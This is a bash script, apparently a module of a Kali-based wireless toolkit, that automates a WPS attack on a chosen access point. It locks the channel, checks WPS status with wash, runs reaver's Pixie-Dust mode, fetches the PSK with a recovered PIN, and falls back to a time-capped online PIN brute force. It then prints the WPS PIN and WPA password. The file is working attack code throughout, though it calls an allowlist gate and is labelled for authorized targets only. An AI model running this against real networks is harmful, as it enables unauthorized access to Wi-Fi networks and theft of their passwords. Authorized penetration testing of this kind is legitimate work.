#!/bin/bash
# =============================================================================
# wps-attack.sh  --  allowlist-gated WPS attack (Kali module)
#
#   Usage:  wps-attack.sh <BSSID>
#
#   Strategy (fastest first, all bounded):
#     1) Pixie-Dust  -- reaver -K 1 (drives pixiewps): an OFFLINE PIN recovery
#        that wins in seconds when the AP's nonce RNG is weak. Default cap 180s.
#     2) If Pixie recovers the PIN but not the PSK, one quick reaver -p <PIN>.
#     3) Fallback online PIN brute -- reaver default attack, cap 600s (a full
#        brute can take hours; in a VM on a flaky adapter this is best-effort,
#        so it is time-capped and only run when WPS actually looks reachable).
#
#   Prints the WPS PIN and the WPA password (PSK) when found.
#
#   Tunables (env):  PIXIE_T=180  BRUTE_T=600  WASH_T=20  FORCE_BRUTE=0
#   AUTHORIZED TARGETS ONLY.
# =============================================================================
set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=common.sh
. "$HERE/common.sh" 2>/dev/null || { echo "RESULT=ERROR missing common.sh beside this script"; exit 1; }

cc_banner "wps-attack"

B="${1:-}"
PIXIE_T="${PIXIE_T:-180}"
BRUTE_T="${BRUTE_T:-600}"
WASH_T="${WASH_T:-20}"
FORCE_BRUTE="${FORCE_BRUTE:-0}"
LOG=/tmp/cc-wps.log; : > "$LOG"

[ -z "$B" ] && cc_die "ERROR_USAGE wps-attack.sh <BSSID>" 1

cc_need reaver airodump-ng
trap cc_cleanup EXIT

# --- safety: soft reset, then the HARD allowlist gate -----------------------
cc_soft_reset
cc_auth_gate "$B"
B="$(cc_norm "$B")"
IF="$(cc_iface)"

# --- lock the AP channel ----------------------------------------------------
CH="$(cc_lock_channel "$B")" || true
[ -z "$CH" ] && cc_die "AP_NOT_FOUND bssid=$B (AP off / out of range / on 5GHz)" 0
cc_log "AP on channel $CH"

# --- is WPS even present / locked?  (advisory; wash false-negatives happen) --
WPS_SEEN=no; WPS_LOCKED=unknown
if cc_have wash; then
  sudo iw dev "$IF" set channel "$CH" 2>/dev/null
  WLINE="$(sudo timeout "$WASH_T" wash -i "$IF" -c "$CH" 2>/dev/null | grep -i "$B" | head -1)"
  if [ -n "$WLINE" ]; then
    WPS_SEEN=yes
    printf '%s' "$WLINE" | grep -qiE '(^| )yes( |$)' && WPS_LOCKED=yes || WPS_LOCKED=no
  fi
  cc_log "wash: wps_seen=$WPS_SEEN locked=$WPS_LOCKED"
fi

# --- helpers to pull PIN / PSK out of reaver|pixiewps output ----------------
get_pin() { grep -aiE 'WPS PIN' "$LOG" | grep -aoE '[0-9]{4,8}' | tail -1; }
# pull the quoted PSK token straight out of the "WPA PSK: '...'" line (no false matches)
get_psk() { grep -aiE "WPA[ -]?PSK" "$LOG" | grep -aoE "'[^']*'" | tail -1 | sed "s/^'//; s/'\$//"; }

report_success() {  # $1 = method label
  local pin psk; pin="$(get_pin)"; psk="$(get_psk)"
  cc_result "WPS_${1}_SUCCESS bssid=$B chan=$CH pin=${pin:-?} psk='${psk:-?}'"
  exit 0
}

# --- 1) Pixie-Dust (offline, fast) ------------------------------------------
cc_log "Pixie-Dust via reaver -K 1 (cap ${PIXIE_T}s)..."
# shellcheck disable=SC2024  # /tmp log is intentionally caller-owned; the radio op is the sudo'd part
sudo timeout "$PIXIE_T" reaver -i "$IF" -b "$B" -c "$CH" -K 1 -N -vv >>"$LOG" 2>&1 || true
if [ -n "$(get_psk)" ]; then report_success PIXIE; fi

# Pixie found the PIN but not the PSK? one quick authenticated pull.
PIN="$(get_pin)"
if [ -n "$PIN" ]; then
  cc_log "Pixie recovered PIN $PIN -- fetching PSK (reaver -p, cap 90s)..."
  # shellcheck disable=SC2024
  sudo timeout 90 reaver -i "$IF" -b "$B" -c "$CH" -p "$PIN" -N -vv >>"$LOG" 2>&1 || true
  [ -n "$(get_psk)" ] && report_success PIXIE
  cc_result "WPS_PIXIE_PIN_ONLY bssid=$B chan=$CH pin=$PIN psk=? (PIN found; PSK fetch incomplete)"
  exit 0
fi

# --- 2) online PIN brute (bounded fallback) ---------------------------------
if [ "$WPS_SEEN" = no ] && [ "$FORCE_BRUTE" != 1 ]; then
  cc_result "WPS_NO_RESULT bssid=$B chan=$CH wps_seen=no (Pixie failed; brute skipped -- set FORCE_BRUTE=1 to try anyway)"
  exit 0
fi
if [ "$WPS_LOCKED" = yes ] && [ "$FORCE_BRUTE" != 1 ]; then
  cc_result "WPS_LOCKED bssid=$B chan=$CH (AP is rate-limiting WPS; Pixie failed, brute skipped -- FORCE_BRUTE=1 to override)"
  exit 0
fi

cc_log "online PIN brute via reaver (cap ${BRUTE_T}s; a full brute can take hours -- best-effort)..."
sudo iw dev "$IF" set channel "$CH" 2>/dev/null
# shellcheck disable=SC2024
sudo timeout "$BRUTE_T" reaver -i "$IF" -b "$B" -c "$CH" -N -vv >>"$LOG" 2>&1 || true
[ -n "$(get_psk)" ] && report_success BRUTE
[ -n "$(get_pin)" ] && { cc_result "WPS_BRUTE_PIN_ONLY bssid=$B chan=$CH pin=$(get_pin) psk=? (increase BRUTE_T and rerun)"; exit 0; }

cc_result "WPS_NO_RESULT bssid=$B chan=$CH wps_seen=$WPS_SEEN locked=$WPS_LOCKED (Pixie+brute exhausted/timed out; see $LOG)"
